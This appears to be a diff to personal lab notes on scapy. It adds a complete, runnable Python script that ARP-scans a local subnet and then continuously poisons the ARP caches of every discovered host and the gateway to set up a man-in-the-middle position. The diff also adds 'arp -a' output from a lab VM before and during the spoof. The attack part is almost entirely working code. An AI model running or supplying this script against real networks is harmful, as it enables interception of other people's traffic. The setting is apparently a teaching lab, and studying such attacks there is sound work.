@@ -934,15 +934,117 @@ def get_mac(IP):
 
 MAC_target = get_mac("172.16.196.134")
 print(MAC_target)
-
-
 ```
 ```python
-ls(ARP)
+from scapy.all import ARP, Ether, sendp, srp, conf, get_if_hwaddr
+import ipaddress
+import signal
+import sys
+import time
+
+INTERFACE = "eth0"
+NETWORK = "192.168.251.0/24"
+GATEWAY_IP = "192.168.251.2"
+SELF_MAC = get_if_hwaddr(INTERFACE)
+
+def arp_scan(network_cidr, iface=INTERFACE, timeout=2):
+    ip_range = ipaddress.IPv4Network(network_cidr, strict=False)
+    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=str(ip_range))
+    answered, _ = srp(packet, timeout=timeout, iface=iface, verbose=False)
+
+    devices = []
+    for sent, received in answered:
+        devices.append({
+            "ip": received.psrc,
+            "mac": received.hwsrc
+        })
+
+    return devices
+
+def get_mac(ip):
+    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
+    answered, _ = srp(packet, timeout=2, iface=INTERFACE, verbose=False)
+    if answered:
+        return answered[0][1].hwsrc
+    raise Exception(f"Could not resolve MAC for {ip}")
+
+def spoof(target_ip, target_mac, spoof_ip):
+    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    sendp(packet, iface=INTERFACE, verbose=False)
+
+def restore(target_ip, target_mac, real_ip, real_mac):
+    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=real_ip, hwsrc=real_mac)
+    sendp(packet, iface=INTERFACE, count=5, verbose=False)
+
+def signal_handler(sig, frame):
+    print("\nRestoring network...")
+    for victim in victims:
+        restore(victim['ip'], victim['mac'], GATEWAY_IP, gateway_mac)
+        restore(GATEWAY_IP, gateway_mac, victim['ip'], victim['mac'])
+    print("ARP tables restored. Exiting.")
+    sys.exit(0)
+
+if __name__ == "__main__":
+    print(f"Scanning network: {NETWORK}")
+    devices = arp_scan(NETWORK)
+    print("Discovered devices:")
+    for d in devices:
+        print(f"{d['ip']} - {d['mac']}")
+
+    try:
+        gateway_mac = get_mac(GATEWAY_IP)
+    except Exception as e:
+        print(f"[!] Failed to get gateway MAC: {e}")
+        sys.exit(1)
+
+    # Filter out the gateway and attacker
+    victims = [d for d in devices if d['ip'] != GATEWAY_IP and d['mac'].lower() != SELF_MAC.lower()]
+
+    if not victims:
+        print("[!] No victims found.")
+        sys.exit(1)
+
+    print(f"\nGateway MAC: {gateway_mac}")
+    print(f"Attacker MAC: {SELF_MAC}")
+
+    signal.signal(signal.SIGINT, signal_handler)
+
+    print("\n[+] Starting two-way ARP spoofing...")
+    packet_count = 0
+
+    try:
+        while True:
+            for victim in victims:
+                spoof(victim['ip'], victim['mac'], GATEWAY_IP)         # victim thinks attacker is gateway
+                spoof(GATEWAY_IP, gateway_mac, victim['ip'])           # gateway thinks attacker is victim
+                packet_count += 2
+            print(f"\r[+] Packets sent: {packet_count}", end="")
+            time.sleep(2)
+    except Exception as e:
+        print(f"\n[!] Runtime error: {e}")
+        signal_handler(None, None)
 ```
 
+When we run the script we should observe the following arp tables ```arp -a```  
+on the target machine with IP
+```192.168.251.128```:
+
+DURING ARP SPOOF:
 ```python
-ls(ARP)
+alice@alice:~$ arp -a
+_gateway (192.168.251.2) at 00:0c:29:69:a8:77 [ether] on ens160
+? (192.168.251.128) at 00:0c:29:69:a8:77 [ether] on ens160
+? (192.168.251.1) at be:d0:74:f2:83:65 [ether] on ens160
+? (192.168.251.254) at 00:50:56:e8:23:2f [ether] on ens160
+alice@alice:~$ arp -a
+```
+
+AFTER AND BEFORE ARP SPOOF on Target Machine:
+```python
+_gateway (192.168.251.2) at 00:50:56:fd:1e:95 [ether] on ens160
+? (192.168.251.128) at 00:0c:29:69:a8:77 [ether] on ens160
+? (192.168.251.1) at be:d0:74:f2:83:65 [ether] on ens160
+? (192.168.251.254) at 00:50:56:e8:23:2f [ether] on ens160
 ```
 ```python
 ls(ARP)
